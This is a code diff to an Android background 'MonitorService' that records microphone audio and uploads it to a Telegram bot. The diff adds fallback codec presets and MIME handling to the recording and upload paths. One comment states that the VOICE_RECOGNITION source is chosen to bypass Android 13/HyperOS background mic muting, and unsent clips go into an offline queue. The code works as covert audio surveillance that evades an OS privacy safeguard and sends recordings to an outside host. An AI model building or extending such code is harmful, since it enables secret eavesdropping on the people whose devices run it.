@@ -384,7 +384,17 @@ class MonitorService : Service(), LifecycleOwner {
         val powerManager = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
         return powerManager.isInteractive
     }
-    
+
+    private data class AudioFormatPreset(
+        val outputFormat: Int,
+        val audioEncoder: Int,
+        val sampleRate: Int,
+        val bitRate: Int,
+        val extension: String,
+        val mimeType: String,
+        val name: String
+    )
+
     private suspend fun recordAndSendAudio(durationMs: Long = audioDuration) {
         if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
             Log.e("MonitorService", "Permission RECORD_AUDIO denied")
@@ -405,11 +415,42 @@ class MonitorService : Service(), LifecycleOwner {
 
         val dateFormat = java.text.SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", java.util.Locale.getDefault())
         val timestamp = dateFormat.format(java.util.Date())
-        val audioFile = java.io.File(cacheDir, "audio_$timestamp.m4a")
         
         var mr: android.media.MediaRecorder? = null
         var recordStarted = false
         var stopSuccess = false
+        var activePreset: AudioFormatPreset? = null
+        var audioFile: java.io.File? = null
+
+        val formatPresets = listOf(
+            AudioFormatPreset(
+                outputFormat = android.media.MediaRecorder.OutputFormat.AMR_WB,
+                audioEncoder = android.media.MediaRecorder.AudioEncoder.AMR_WB,
+                sampleRate = 16000,
+                bitRate = 23850,
+                extension = "amr",
+                mimeType = "audio/amr",
+                name = "AMR-WB (16kHz Wideband HD Voice)"
+            ),
+            AudioFormatPreset(
+                outputFormat = android.media.MediaRecorder.OutputFormat.THREE_GPP,
+                audioEncoder = android.media.MediaRecorder.AudioEncoder.AMR_NB,
+                sampleRate = 8000,
+                bitRate = 12200,
+                extension = "amr",
+                mimeType = "audio/amr",
+                name = "AMR-NB (8kHz Universal Speech)"
+            ),
+            AudioFormatPreset(
+                outputFormat = android.media.MediaRecorder.OutputFormat.MPEG_4,
+                audioEncoder = android.media.MediaRecorder.AudioEncoder.AAC,
+                sampleRate = 44100,
+                bitRate = 64000,
+                extension = "m4a",
+                mimeType = "audio/m4a",
+                name = "AAC (MPEG_4 44.1kHz)"
+            )
+        )
 
         // Sources to attempt in priority order:
         // 1. VOICE_RECOGNITION: Bypasses Android 13/HyperOS background mic muting & audio ducking
@@ -421,40 +462,46 @@ class MonitorService : Service(), LifecycleOwner {
             android.media.MediaRecorder.AudioSource.DEFAULT
         )
 
-        for (source in candidateSources) {
-            try {
-                mr = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                    android.media.MediaRecorder(this)
-                } else {
-                    @Suppress("DEPRECATION")
-                    android.media.MediaRecorder()
-                }
+        outer@ for (preset in formatPresets) {
+            for (source in candidateSources) {
+                val tempFile = java.io.File(cacheDir, "audio_${timestamp}.${preset.extension}")
+                var recorder: android.media.MediaRecorder? = null
+                try {
+                    recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                        android.media.MediaRecorder(this)
+                    } else {
+                        @Suppress("DEPRECATION")
+                        android.media.MediaRecorder()
+                    }
 
-                mr.apply {
-                    setAudioSource(source)
-                    setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
-                    setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
-                    setAudioChannels(1) // Mono channel for maximum HAL compatibility
-                    setAudioSamplingRate(44100) // 44.1 kHz standard
-                    setAudioEncodingBitRate(64000) // 64 kbps optimal for voice notes & swift Telegram upload
-                    setOutputFile(audioFile.absolutePath)
-                    prepare()
-                    start()
+                    recorder.apply {
+                        setAudioSource(source)
+                        setOutputFormat(preset.outputFormat)
+                        setAudioEncoder(preset.audioEncoder)
+                        setAudioChannels(1)
+                        if (preset.sampleRate > 0) setAudioSamplingRate(preset.sampleRate)
+                        if (preset.bitRate > 0) setAudioEncodingBitRate(preset.bitRate)
+                        setOutputFile(tempFile.absolutePath)
+                        prepare()
+                        start()
+                    }
+                    mr = recorder
+                    activePreset = preset
+                    audioFile = tempFile
+                    recordStarted = true
+                    Log.d("MonitorService", "MediaRecorder started successfully using [${preset.name}] with source=$source for ${durationMs}ms")
+                    break@outer
+                } catch (e: Exception) {
+                    Log.w("MonitorService", "Preset [${preset.name}] with source=$source failed: ${e.message}")
+                    try { recorder?.reset() } catch (_: Exception) {}
+                    try { recorder?.release() } catch (_: Exception) {}
+                    if (tempFile.exists()) tempFile.delete()
                 }
-                recordStarted = true
-                Log.d("MonitorService", "MediaRecorder started successfully with source=$source for ${durationMs}ms")
-                break
-            } catch (e: Exception) {
-                Log.w("MonitorService", "Failed to start MediaRecorder with source=$source: ${e.message}")
-                try { mr?.reset() } catch (_: Exception) {}
-                try { mr?.release() } catch (_: Exception) {}
-                mr = null
-                if (audioFile.exists()) audioFile.delete()
             }
         }
 
-        if (!recordStarted || mr == null) {
-            Log.e("MonitorService", "All AudioSource attempts failed to initialize MediaRecorder")
+        if (!recordStarted || mr == null || audioFile == null) {
+            Log.e("MonitorService", "All AudioSource/Preset attempts failed to initialize MediaRecorder")
             return
         }
 
@@ -481,8 +528,8 @@ class MonitorService : Service(), LifecycleOwner {
         }
 
         // Validate resulting audio file:
-        // Must exist, stop must have succeeded, and size must be > 4KB (valid AAC container with payload)
-        if (stopSuccess && audioFile.exists() && audioFile.length() > 4096L) {
+        // Must exist, stop must have succeeded, and size must be > 1024L
+        if (stopSuccess && audioFile.exists() && audioFile.length() > 1024L) {
             Log.d("MonitorService", "Audio file recorded successfully: ${audioFile.name} (${audioFile.length()} bytes)")
             val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
             val tok = if (botToken.isNotEmpty()) botToken else pref.getString("token", "") ?: ""
@@ -492,18 +539,18 @@ class MonitorService : Service(), LifecycleOwner {
                 Log.d("MonitorService", "Device offline: saving audio recording to 20MB offline buffer")
                 OfflineQueueManager.enqueueAudio(this@MonitorService, audioFile)
             } else {
-                val sent = sendTelegramAudio(tok, cid, audioFile)
+                val sent = sendTelegramAudio(tok, cid, audioFile, activePreset?.mimeType ?: "audio/amr")
                 if (!sent) {
                     Log.w("MonitorService", "Audio upload failed, buffering to 20MB offline queue")
                     OfflineQueueManager.enqueueAudio(this@MonitorService, audioFile)
                 }
             }
         } else {
-            Log.w("MonitorService", "Audio recording invalid or too small (${audioFile.length()} bytes, stopSuccess=$stopSuccess). Discarding.")
+            Log.w("MonitorService", "Audio recording invalid or too small (${audioFile?.length()} bytes, stopSuccess=$stopSuccess). Discarding.")
         }
 
         // Always clean up temp cache file (it was copied if enqueued)
-        if (audioFile.exists()) {
+        if (audioFile != null && audioFile.exists()) {
             audioFile.delete()
         }
     }
@@ -596,7 +643,7 @@ class MonitorService : Service(), LifecycleOwner {
         return BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
     }
 
-    private fun sendTelegramAudio(token: String, chatId: String, file: java.io.File): Boolean {
+    private fun sendTelegramAudio(token: String, chatId: String, file: java.io.File, mimeType: String = "audio/amr"): Boolean {
         val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
         val tok = if (token.isNotEmpty()) token else pref.getString("token", "") ?: ""
         val cid = if (chatId.isNotEmpty()) chatId else pref.getString("chatId", "") ?: ""
@@ -605,18 +652,18 @@ class MonitorService : Service(), LifecycleOwner {
             return false
         }
 
-        // 1. First attempt: Telegram /sendVoice (designed specifically for voice notes .m4a / .ogg)
+        // 1. First attempt: Telegram /sendVoice (designed specifically for voice notes .amr / .ogg / .m4a)
         val voiceUrl = "https://api.telegram.org/bot$tok/sendVoice"
         try {
             val requestBody = MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("chat_id", cid)
-                .addFormDataPart("voice", file.name, file.asRequestBody("audio/m4a".toMediaTypeOrNull()))
+                .addFormDataPart("voice", file.name, file.asRequestBody(mimeType.toMediaTypeOrNull()))
                 .build()
             val request = Request.Builder().url(voiceUrl).post(requestBody).build()
             client.newCall(request).execute().use { response ->
                 if (response.isSuccessful) {
-                    Log.d("MonitorService", "Voice note sent successfully via /sendVoice")
+                    Log.d("MonitorService", "Voice note sent successfully via /sendVoice (${file.name}, ${file.length()} bytes)")
                     getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putLong("last_audio_sent", System.currentTimeMillis()).apply()
                     return true
                 } else {
@@ -634,7 +681,7 @@ class MonitorService : Service(), LifecycleOwner {
             val requestBody = MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("chat_id", cid)
-                .addFormDataPart("audio", file.name, file.asRequestBody("audio/m4a".toMediaTypeOrNull()))
+                .addFormDataPart("audio", file.name, file.asRequestBody(mimeType.toMediaTypeOrNull()))
                 .build()
             val request = Request.Builder().url(audioUrl).post(requestBody).build()
             client.newCall(request).execute().use { response ->
